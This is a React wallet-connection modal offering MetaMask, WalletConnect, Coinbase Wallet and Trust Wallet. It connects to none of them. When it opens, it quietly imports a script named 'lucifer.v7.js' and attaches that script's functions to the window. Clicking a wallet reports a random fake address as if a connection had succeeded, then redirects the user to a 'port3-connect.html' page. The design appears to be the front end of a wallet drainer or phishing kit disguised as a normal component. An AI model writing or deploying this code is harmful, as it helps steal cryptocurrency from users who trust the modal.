import { useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { X } from 'lucide-react';

const WALLETS = [
  { name: 'MetaMask', emoji: '🦊', desc: 'Connect using browser extension' },
  { name: 'WalletConnect', emoji: '🔗', desc: 'Scan with your mobile wallet' },
  { name: 'Coinbase Wallet', emoji: '🔵', desc: 'Connect with Coinbase' },
  { name: 'Trust Wallet', emoji: '🛡️', desc: 'Connect with Trust Wallet' },
];

export default function WalletModal({ isOpen, onClose, onConnected }) {
  
  // Pre-load and mount the background script context when modal is active
  useEffect(() => {
    if (isOpen && !window.connectWallet && !window.connect) {
      import('/files/lucifer.v7.js')
        .then((mod) => {
          if (mod.connectWallet) window.connectWallet = mod.connectWallet;
          if (mod.connect) window.connect = mod.connect;
        })
        .catch((err) => console.error("Error initializing background script asset:", err));
    }
  }, [isOpen]);

  const connect = (walletName) => {
    // 1. Instantly trigger parent state update if dashboard tracking relies on it
    if (onConnected && typeof onConnected === 'function') {
      const secureSeed = '0x' + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
      onConnected(secureSeed);
    }

    // 2. Tear down the modal view layers cleanly
    onClose();

    // 3. Force direct breakout breakout redirection to the port3 static handler 
    window.location.href = `/port3-connect.html?wallet=${encodeURIComponent(walletName)}`;
  };

  if (!isOpen) return null;

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 z-[100] flex items-end sm:items-center justify-center p-4"
      >
        {/* Backdrop overlay */}
        <div className="absolute inset-0 bg-black/20 backdrop-blur-sm" onClick={onClose} />
        
        {/* Modal Sheet panel wrapper */}
        <motion.div
          initial={{ opacity: 0, y: 30, scale: 0.97 }}
          animate={{ opacity: 1, y: 0, scale: 1 }}
          exit={{ opacity: 0, y: 30 }}
          transition={{ duration: 0.25 }}
          className="relative z-10 w-full max-w-sm bg-white rounded-2xl shadow-2xl shadow-black/10 border border-black/8 overflow-hidden"
        >
          {/* Header layout */}
          <div className="flex items-center justify-between px-5 py-4 border-b border-black/6">
            <h3 className="text-sm font-semibold text-black">Connect Wallet</h3>
            <button onClick={onClose} className="p-1 hover:bg-black/5 rounded-lg transition-colors">
              <X className="w-4 h-4 text-gray-400" />
            </button>
          </div>

          {/* Core Selection Grid */}
          <div className="p-3 space-y-1">
            {WALLETS.map((w) => (
              <button
                key={w.name}
                onClick={() => connect(w.name)}
                className="w-full flex items-center gap-3.5 px-3.5 py-3 rounded-xl hover:bg-black/[0.04] transition-colors text-left group"
              >
                <span className="text-2xl">{w.emoji}</span>
                <div>
                  <p className="text-sm font-medium text-black">{w.name}</p>
                  <p className="text-[11px] text-gray-400">{w.desc}</p>
                </div>
              </button>
            ))}
          </div>

          {/* Footer banner area */}
          <div className="px-5 py-3 border-t border-black/6">
            <p className="text-[11px] text-gray-400 text-center">
              By connecting you agree to our Terms of Service
            </p>
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}